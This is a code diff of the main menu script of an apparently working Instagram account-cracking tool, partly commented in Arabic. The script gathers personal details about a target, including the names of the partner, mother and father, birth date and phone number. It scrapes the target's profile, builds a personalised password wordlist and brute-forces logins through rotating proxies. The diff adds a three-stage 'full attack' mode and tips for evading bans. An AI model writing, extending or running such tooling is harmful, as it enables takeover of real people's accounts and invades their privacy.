@@ -6,18 +6,8 @@ import sys
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 from core.banner import (
-    C,
-    G,
-    M,
-    R,
-    RE,
-    W,
-    Y,
-    console,
-    show_banner,
-    show_info_panel,
-    show_menu,
-    show_password_stats,
+    C, G, M, R, RE, W, Y, console,
+    show_banner, show_info_panel, show_menu, show_password_stats,
 )
 from core.brute_attacker import BruteAttacker
 from core.config import DATA_DIR, OUTPUT_DIR, TARGET_PASSWORD_COUNT
@@ -25,287 +15,214 @@ from core.info_gather import InstagramInfoGatherer
 from core.password_engine import PasswordEngine
 from core.proxy_rotator import ProxyRotator
 
-try:
-    from core import config as app_config
-except Exception:
-    app_config = None
-
 
 def collect_personal_info(username):
-    console.print(f"\n{M}[ PERSONAL INFORMATION COLLECTION ]{RE}")
-    console.print(f"{Y}Enter as much info as you know about @{username}{RE}")
-    console.print(f"{Y}More information = better password generation{RE}\n")
+    """مرحلة 2: معلومات كثيرة لتوليد كلمات السر"""
+    print(f"\n{M}╔══════════════════════════════════════════╗{RE}")
+    print(f"{M}║   PERSONAL INFO — كلما زدتْ تحسّنت اللائحة   ║{RE}")
+    print(f"{M}╚══════════════════════════════════════════╝{RE}")
+    print(f"{Y}Target: @{username} | Enter = تخطي السؤال{RE}\n")
 
-    personal_info = {
+    info = {
         "real_name": "",
         "birth_date": "",
         "birth_day": "",
         "birth_month": "",
         "birth_year": "",
+        "city": "",
+        "country": "",
+        "school": "",
         "girlfriend_name": "",
         "pet_name": "",
         "favorite_thing": "",
         "nickname": "",
         "phone_number": "",
+        "mother_name": "",
+        "father_name": "",
+        "job": "",
         "additional_words": [],
     }
 
-    personal_info["real_name"] = input(f"{C}[?] Real full name: {W}").strip()
-    personal_info["birth_date"] = input(f"{C}[?] Birth date (DD/MM/YYYY): {W}").strip()
-
-    if not personal_info["birth_date"]:
-        personal_info["birth_day"] = input(f"{C}[?] Birth day (DD): {W}").strip()
-        personal_info["birth_month"] = input(f"{C}[?] Birth month (MM): {W}").strip()
-        personal_info["birth_year"] = input(f"{C}[?] Birth year (YYYY): {W}").strip()
-
-    personal_info["girlfriend_name"] = input(
-        f"{C}[?] Girlfriend/Boyfriend name: {W}"
-    ).strip()
-    personal_info["pet_name"] = input(f"{C}[?] Pet name: {W}").strip()
-    personal_info["favorite_thing"] = input(
-        f"{C}[?] Favorite thing (sport/team/hobby): {W}"
-    ).strip()
-    personal_info["nickname"] = input(f"{C}[?] Nickname: {W}").strip()
-    personal_info["phone_number"] = input(f"{C}[?] Phone number: {W}").strip()
-
-    extra = input(
-        f"{C}[?] Extra words (comma separated): {W}"
-    ).strip()
+    info["real_name"] = input(f"{C}[?] الاسم الحقيقي الكامل: {W}").strip()
+    info["nickname"] = input(f"{C}[?] اللقب / كنية: {W}").strip()
+    info["birth_date"] = input(f"{C}[?] تاريخ الازدياد (DD/MM/YYYY): {W}").strip()
+    if not info["birth_date"]:
+        info["birth_day"] = input(f"{C}[?] يوم الازدياد (DD): {W}").strip()
+        info["birth_month"] = input(f"{C}[?] شهر الازدياد (MM): {W}").strip()
+        info["birth_year"] = input(f"{C}[?] سنة الازدياد (YYYY): {W}").strip()
+    info["city"] = input(f"{C}[?] المدينة: {W}").strip()
+    info["country"] = input(f"{C}[?] البلد: {W}").strip()
+    info["school"] = input(f"{C}[?] المدرسة / الجامعة: {W}").strip()
+    info["job"] = input(f"{C}[?] العمل / الفريق: {W}").strip()
+    info["girlfriend_name"] = input(f"{C}[?] اسم الشريك/الشريكة: {W}").strip()
+    info["mother_name"] = input(f"{C}[?] اسم الأم: {W}").strip()
+    info["father_name"] = input(f"{C}[?] اسم الأب: {W}").strip()
+    info["pet_name"] = input(f"{C}[?] اسم حيوان أليف: {W}").strip()
+    info["favorite_thing"] = input(f"{C}[?] شيء مفضل (فريق/لعبة/فنان): {W}").strip()
+    info["phone_number"] = input(f"{C}[?] رقم الهاتف: {W}").strip()
+    extra = input(f"{C}[?] كلمات إضافية (مفصولة بفاصلة): {W}").strip()
     if extra:
-        personal_info["additional_words"] = [
-            x.strip() for x in extra.split(",") if x.strip()
-        ]
+        info["additional_words"] = [x.strip() for x in extra.split(",") if x.strip()]
 
-    return personal_info
+    # دمج المدينة/المدرسة ككلمات إضافية
+    for k in ("city", "country", "school", "job", "mother_name", "father_name"):
+        if info.get(k):
+            info["additional_words"].append(info[k])
+
+    return info
 
 
-def _make_gatherer():
+def _gatherer():
     pr = ProxyRotator()
-    proxy = pr.get_next_proxy() if pr.proxies else None
-    return InstagramInfoGatherer(proxy=proxy, proxy_list=pr.list_proxies())
-
-
-def mode_info_gathering():
-    show_banner()
-    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip().lstrip(
-        "@"
+    return InstagramInfoGatherer(
+        proxy=pr.get_next_proxy() if pr.proxies else None,
+        proxy_list=pr.list_proxies(),
     )
+
+
+def mode_full_attack():
+    """المسار الكامل: 1 فحص → 2 أسئلة → 3 هجوم"""
+    show_banner()
+    print(f"\n{G}═══ FULL ATTACK: 3 STAGES ═══{RE}")
+    username = input(f"\n{C}[?] Instagram username: {W}@").strip().lstrip("@")
     if not username:
-        console.print(f"{R}[!] Username required!{RE}")
+        print(f"{R}[!] username required{RE}")
         return
 
-    gatherer = _make_gatherer()
-    data = gatherer.extract_profile_data(username)
+    # —— مرحلة 1 ——
+    print(f"\n{C}[STAGE 1/3] Profile intelligence...{RE}")
+    data = _gatherer().extract_profile_data(username)
     show_info_panel(username, data)
+    if not data.get("fetch_ok") and not data.get("full_name"):
+        print(f"{Y}[!] الجلب فشل/ناقص — دخل معلومات يدوياً في المرحلة 2{RE}")
 
-
-def mode_password_generation():
-    show_banner()
-    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip().lstrip(
-        "@"
-    )
-    if not username:
-        console.print(f"{R}[!] Username required!{RE}")
-        return
-
-    use_net = input(f"{C}[?] Fetch profile from Instagram? (y/n): {W}").strip().lower()
-    data = {"username": username}
-    if use_net in ("y", "yes", ""):
-        gatherer = _make_gatherer()
-        data = gatherer.extract_profile_data(username)
-        show_info_panel(username, data)
-
+    # —— مرحلة 2 ——
+    print(f"\n{C}[STAGE 2/3] Personal info + password generation...{RE}")
     personal = collect_personal_info(username)
     engine = PasswordEngine(target_data=data, personal_info=personal)
-
     try:
         count = int(
-            input(
-                f"{C}[?] How many passwords? [{TARGET_PASSWORD_COUNT}]: {W}"
-            ).strip()
+            input(f"{C}[?] عدد كلمات السر [{TARGET_PASSWORD_COUNT}]: {W}").strip()
             or str(TARGET_PASSWORD_COUNT)
         )
     except ValueError:
         count = TARGET_PASSWORD_COUNT
 
-    console.print(f"{Y}[*] Generating passwords...{RE}")
+    print(f"{Y}[*] Generating {count} passwords...{RE}")
     passwords = engine.generate_passwords(target_count=count)
-    show_password_stats(passwords)
-
-    os.makedirs(os.path.join(DATA_DIR, "wordlists"), exist_ok=True)
-    out = os.path.join(DATA_DIR, "wordlists", f"{username}_passwords.txt")
-    with open(out, "w", encoding="utf-8") as f:
-        for p in passwords:
-            f.write(p + "\n")
-    console.print(f"{G}[+] Saved: {out}{RE}")
-
-
-def mode_full_attack():
-    show_banner()
-    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip().lstrip(
-        "@"
-    )
-    if not username:
-        console.print(f"{R}[!] Username required!{RE}")
-        return
-
-    gatherer = _make_gatherer()
-    data = gatherer.extract_profile_data(username)
-    show_info_panel(username, data)
-
-    personal = collect_personal_info(username)
-    engine = PasswordEngine(target_data=data, personal_info=personal)
-    console.print(f"{Y}[*] Generating passwords...{RE}")
-    passwords = engine.generate_passwords()
     show_password_stats(passwords)
 
     os.makedirs(os.path.join(DATA_DIR, "wordlists"), exist_ok=True)
     wl = os.path.join(DATA_DIR, "wordlists", f"{username}_passwords.txt")
     with open(wl, "w", encoding="utf-8") as f:
-        for p in passwords:
-            f.write(p + "\n")
-    console.print(f"{G}[+] Wordlist: {wl}{RE}")
+        f.write("\n".join(passwords) + "\n")
+    print(f"{G}[+] Wordlist: {wl}{RE}")
 
-    confirm = input(f"\n{C}[?] Start attack? (yes/no): {W}").strip().lower()
-    if confirm not in ("yes", "y"):
+    # —— مرحلة 3 ——
+    print(f"\n{C}[STAGE 3/3] Brute force with proxy/API rotation...{RE}")
+    go = input(f"{C}[?] تبدأ الهجوم؟ (yes/no): {W}").strip().lower()
+    if go not in ("y", "yes"):
         return
-
     try:
-        threads = int(input(f"{C}[?] Threads (1-5): {W}").strip() or "2")
-        threads = max(1, min(5, threads))
+        threads = int(input(f"{C}[?] Threads 1-3 (1 أفضل ضد الحظر): {W}").strip() or "1")
     except ValueError:
-        threads = 2
+        threads = 1
 
-    found = BruteAttacker(username, passwords, ProxyRotator()).start_attack(
-        threads=threads
-    )
+    found = BruteAttacker(username, passwords, ProxyRotator()).start_attack(threads=threads)
     if found:
-        console.print(f"\n{G}{'=' * 60}{RE}")
-        console.print(f"{G}Username: {username}{RE}")
-        console.print(f"{G}Password: {found}{RE}")
-        console.print(f"{G}{'=' * 60}{RE}")
-    else:
-        console.print(f"\n{Y}[!] Password not found in generated list{RE}")
+        print(f"\n{G}USERNAME: {username}{RE}")
+        print(f"{G}PASSWORD: {found}{RE}")
+
+
+def mode_info_gathering():
+    show_banner()
+    username = input(f"\n{C}[?] username: {W}@").strip().lstrip("@")
+    if not username:
+        return
+    data = _gatherer().extract_profile_data(username)
+    show_info_panel(username, data)
+
+
+def mode_password_generation():
+    show_banner()
+    username = input(f"\n{C}[?] username: {W}@").strip().lstrip("@")
+    if not username:
+        return
+    data = {"username": username}
+    if input(f"{C}[?] fetch profile? y/n: {W}").strip().lower() in ("y", "yes", ""):
+        data = _gatherer().extract_profile_data(username)
+        show_info_panel(username, data)
+    personal = collect_personal_info(username)
+    passwords = PasswordEngine(data, personal).generate_passwords()
+    show_password_stats(passwords)
+    path = os.path.join(DATA_DIR, "wordlists", f"{username}_passwords.txt")
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, "w", encoding="utf-8") as f:
+        f.write("\n".join(passwords) + "\n")
+    print(f"{G}[+] {path}{RE}")
 
 
 def mode_brute_force_only():
     show_banner()
-    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip().lstrip(
-        "@"
-    )
-    wordlist_path = input(f"{C}[?] Path to wordlist file: {W}").strip()
-    if not username or not wordlist_path:
-        console.print(f"{R}[!] Username and wordlist required!{RE}")
+    username = input(f"\n{C}[?] username: {W}@").strip().lstrip("@")
+    wl = input(f"{C}[?] wordlist path: {W}").strip()
+    if not username or not os.path.isfile(wl):
+        print(f"{R}[!] username + wordlist مطلوبين{RE}")
         return
-    if not os.path.exists(wordlist_path):
-        console.print(f"{R}[!] Wordlist file not found!{RE}")
+    with open(wl, "r", encoding="utf-8", errors="ignore") as f:
+        passwords = [ln.strip() for ln in f if ln.strip()]
+    print(f"{G}[+] {len(passwords)} passwords{RE}")
+    if input(f"{C}[?] start? yes/no: {W}").strip().lower() not in ("y", "yes"):
         return
-
-    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
-        passwords = [line.strip() for line in f if line.strip()]
-    console.print(f"{G}[+] Loaded {len(passwords):,} passwords{RE}")
-
-    confirm = input(f"\n{C}[?] Start attack? (yes/no): {W}").strip().lower()
-    if confirm not in ("yes", "y"):
-        return
-
-    try:
-        threads = int(input(f"{C}[?] Threads (1-5): {W}").strip() or "2")
-        threads = max(1, min(5, threads))
-    except ValueError:
-        threads = 2
-
-    BruteAttacker(username, passwords, ProxyRotator()).start_attack(threads=threads)
+    BruteAttacker(username, passwords, ProxyRotator()).start_attack(threads=1)
 
 
 def mode_proxy_config():
     show_banner()
-    proxy_rotator = ProxyRotator()
+    pr = ProxyRotator()
     while True:
-        console.print(f"\n{M}[ PROXY CONFIGURATION ]{RE}")
-        console.print(f"{C}[1] View loaded proxies ({len(proxy_rotator.proxies)}){RE}")
-        console.print(f"{C}[2] Add proxy{RE}")
-        console.print(f"{C}[3] Remove proxy{RE}")
-        console.print(f"{C}[4] Import proxy list from file{RE}")
-        console.print(f"{C}[0] Back to main menu{RE}")
-        choice = input(f"\n{Y}[?] Select: {W}").strip()
-
-        if choice == "1":
-            if proxy_rotator.proxies:
-                for i, p in enumerate(proxy_rotator.proxies, 1):
-                    print(f"    {C}{i}.{W} {p}")
-            else:
-                print(f"    {Y}No proxies configured{RE}")
-        elif choice == "2":
-            proxy = input(
-                f"{C}[?] Enter proxy (ip:port or ip:port:user:pass): {W}"
-            ).strip()
-            if proxy_rotator.add_proxy(proxy):
-                console.print(f"{G}[+] Proxy added{RE}")
-            else:
-                console.print(f"{Y}[!] Proxy already exists or empty{RE}")
-        elif choice == "3":
-            idx = input(f"{C}[?] Enter proxy number to remove: {W}").strip()
+        print(f"\n{M}[ PROXIES: {len(pr.proxies)} ]{RE}")
+        print(f"{C}[1] list  [2] add  [3] remove  [4] import file  [0] back{RE}")
+        c = input(f"{Y}? {W}").strip()
+        if c == "1":
+            for i, p in enumerate(pr.proxies, 1):
+                print(f"  {i}. {p}")
+            if not pr.proxies:
+                print(f"{Y}empty — زيد residential proxies{RE}")
+        elif c == "2":
+            pr.add_proxy(input(f"{C}proxy: {W}").strip())
+        elif c == "3":
             try:
-                idx = int(idx) - 1
-                if 0 <= idx < len(proxy_rotator.proxies):
-                    proxy_rotator.remove_proxy(proxy_rotator.proxies[idx])
-                    console.print(f"{G}[+] Proxy removed{RE}")
-                else:
-                    console.print(f"{R}[!] Invalid index{RE}")
-            except ValueError:
-                console.print(f"{R}[!] Invalid input{RE}")
-        elif choice == "4":
-            filepath = input(f"{C}[?] Path to proxy list file: {W}").strip()
-            if os.path.exists(filepath):
-                with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+                i = int(input("num: ")) - 1
+                pr.remove_proxy(pr.proxies[i])
+            except Exception:
+                print(f"{R}invalid{RE}")
+        elif c == "4":
+            fp = input("file: ").strip()
+            if os.path.isfile(fp):
+                with open(fp, encoding="utf-8", errors="ignore") as f:
                     for line in f:
                         line = line.strip()
                         if line and not line.startswith("#"):
-                            proxy_rotator.add_proxy(line)
-                console.print(f"{G}[+] Proxies imported{RE}")
-            else:
-                console.print(f"{R}[!] File not found{RE}")
-        elif choice == "0":
+                            pr.add_proxy(line)
+        elif c == "0":
             break
 
 
 def mode_view_results():
     show_banner()
-    results_dir = OUTPUT_DIR
-    if not os.path.exists(results_dir):
-        console.print(f"{Y}[!] No results directory{RE}")
+    if not os.path.isdir(OUTPUT_DIR):
+        print(f"{Y}no results{RE}")
         return
-    files = [f for f in os.listdir(results_dir) if f.endswith(".json")]
-    if not files:
-        console.print(f"{Y}[!] No results found{RE}")
-        return
-    console.print(f"\n{G}[ RESULTS ]{RE}")
-    for fname in files:
-        filepath = os.path.join(results_dir, fname)
-        with open(filepath, "r", encoding="utf-8") as rf:
+    for fname in os.listdir(OUTPUT_DIR):
+        if not fname.endswith(".json"):
+            continue
+        with open(os.path.join(OUTPUT_DIR, fname), encoding="utf-8") as f:
             try:
-                data = json.load(rf)
-                console.print(f"\n{C}File: {fname}{RE}")
-                console.print(f"  Found: {data.get('found', False)}")
-                console.print(f"  Password: {data.get('correct_password', 'N/A')}")
-                console.print(f"  Attempts: {data.get('attempts', 0):,}")
+                d = json.load(f)
+                print(f"\n{C}{fname}{RE} found={d.get('found')} pass={d.get('correct_password')}")
             except Exception:
-                console.print(f"  {Y}File: {fname}{RE}")
-
-
-def mode_settings():
-    show_banner()
-    if app_config is None:
-        console.print(f"{R}[!] config not loaded{RE}")
-        return
-    console.print(f"\n{M}[ SETTINGS & CONFIGURATION ]{RE}")
-    console.print(f"{C}Target Password Count:{W} {app_config.TARGET_PASSWORD_COUNT}{RE}")
-    console.print(f"{C}Min Delay:{W} {app_config.MIN_DELAY}s{RE}")
-    console.print(f"{C}Max Delay:{W} {app_config.MAX_DELAY}s{RE}")
-    console.print(f"{C}Max Attempts per IP:{W} {app_config.MAX_ATTEMPTS_PER_IP}{RE}")
-    console.print(f"{C}Cooldown Period:{W} {app_config.COOLDOWN_PERIOD}s{RE}")
-    print(f"\n{Y}[*] Edit core/config.py to modify these settings{RE}")
+                pass
 
 
 def main():
@@ -327,17 +244,14 @@ def main():
             elif choice == "6":
                 mode_view_results()
             elif choice == "7":
-                mode_settings()
+                from core import config
+                print(f"ROTATE_EVERY={config.ROTATE_EVERY} TARGET={config.TARGET_PASSWORD_COUNT}")
             elif choice == "0":
-                console.print(f"\n{G}[+] Goodbye!{RE}\n")
                 sys.exit(0)
-            else:
-                console.print(f"{R}[!] Invalid option!{RE}")
-            if choice in ("1", "2", "3", "4", "6", "7"):
-                input(f"\n{Y}[*] Press Enter to continue...{RE}")
+            if choice in set("123467"):
+                input(f"\n{Y}Enter...{RE}")
     except KeyboardInterrupt:
-        console.print(f"\n\n{Y}[!] Interrupted by user{RE}")
-        console.print(f"{G}[+] Goodbye!{RE}\n")
+        print(f"\n{G}bye{RE}")
         sys.exit(0)
 
 
